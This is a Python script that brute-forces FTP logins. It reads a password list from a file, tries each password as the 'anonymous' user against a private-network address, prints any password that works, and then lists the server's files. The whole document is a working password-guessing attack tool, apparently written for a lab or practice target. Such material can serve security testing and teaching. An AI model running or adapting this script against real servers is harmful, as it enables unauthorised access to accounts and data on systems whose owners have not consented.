from ftplib import FTP
from colorama import Fore, Style

def ftp_login(server, username, password):
    try:
        # Connect to the FTP server
        ftp = FTP(server)
        ftp.login(username, password)
        print(Fore.GREEN + "Login successful.", password)

        # Perform FTP operations after successful login
        print("Current directory:", ftp.pwd())
        print("Listing files:")
        files = ftp.nlst()
        for file in files:
            print(file)

        ftp.quit()
        return True

    except Exception as e:
        print(Fore.RED + "Login failed with password:", password)
        return False

# FTP server details
server = "192.168.30.137"
username = "anonymous"
password_file = "pass.txt"  # Replace with your password list file

# Read the password list from the file
with open(password_file, "r") as file:
    passwords = file.read().splitlines()

# Attempt login with each password in the list
for password in passwords:
    if ftp_login(server, username, password):
        break  # Break the loop if successful login is found

# Reset color formatting
print(Style.RESET_ALL)
